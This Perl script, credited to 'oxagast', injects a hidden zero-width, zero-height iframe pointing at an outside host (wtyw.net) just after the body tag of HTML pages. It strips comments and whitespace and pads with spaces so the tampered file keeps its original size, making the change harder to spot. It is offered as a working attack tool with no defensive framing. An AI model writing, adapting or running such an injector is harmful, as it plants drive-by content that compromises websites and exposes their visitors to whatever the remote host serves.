#!/usr/bin/perl
# oxagast / Marshall Whittaker
$inject = '<iframe width=0 height=0 src="http://wtyw.net/lm"></iframe>';


while ($a = <>) {
  $c = $c . $a;
  $b = $b . $a;
}
if($b =~ m/<body/i) {
  $chars1 = length($c);
  $b =~ s/<!--.*-->//g;
  $b =~ s/\n//g;
  $b =~ s/\t//g;
  $b =~ s/ {2,}/ /;
  $b =~ s/(<[body|BODY].*?>)(.*)/$1$inject$2/;
}
$chars2 = length($b);
if ($chars1 > $chars2) {
  $b = $b . " "x($chars1-$chars2);
  $date = `date`;
  chomp($date);
  print STDERR "[*] $date Injected.\n";
  print $b;
} 
if ($chars1 < $chars2) {
  $date = `date`;
  chomp($date);
  print STDERR "[x] $date Injection failed.\n";
  print $c;
}
